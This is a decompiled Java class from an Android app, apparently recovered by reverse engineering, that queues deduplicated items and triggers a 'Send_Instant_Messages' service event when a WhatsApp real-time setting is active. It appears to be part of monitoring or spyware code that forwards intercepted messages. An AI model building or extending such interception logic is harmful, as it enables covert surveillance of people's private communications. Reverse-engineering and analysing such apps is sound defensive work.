package com.security.a;

import android.content.Intent;
import com.android.system.CoreApp;
import com.app.system.common.h.i;
import com.app.system.common.service.EventsAndReceiveService;
import com.security.ServiceSettings;
import java.util.ArrayList;
import java.util.Iterator;

public class a
{
  private static a c;
  ArrayList<b> a = new ArrayList();
  i b = new i(CoreApp.a());
  
  public static a a()
  {
    if (c == null) {
      c = new a();
    }
    return c;
  }
  
  private boolean b(b paramb)
  {
    Iterator localIterator = this.a.iterator();
    while (localIterator.hasNext())
    {
      b localb = (b)localIterator.next();
      if ((localb.b.equals(paramb.b)) && (localb.c.equals(paramb.c)) && (localb.a.equals(paramb.a)) && (localb.d == paramb.d)) {
        return true;
      }
    }
    return false;
  }
  
  public void a(b paramb)
  {
    if ((ServiceSettings.a().whatsappRtActive) && (!b(paramb)))
    {
      this.a.add(paramb);
      this.b.a(paramb);
      paramb = new Intent(CoreApp.a(), EventsAndReceiveService.class);
      paramb.putExtra("event_core_app", "Send_Instant_Messages");
      com.b.a.a.a.a(CoreApp.a(), paramb);
    }
  }
}


/* Location:              ~/com/security/a/a.class
 *
 * Reversed by:           J
 */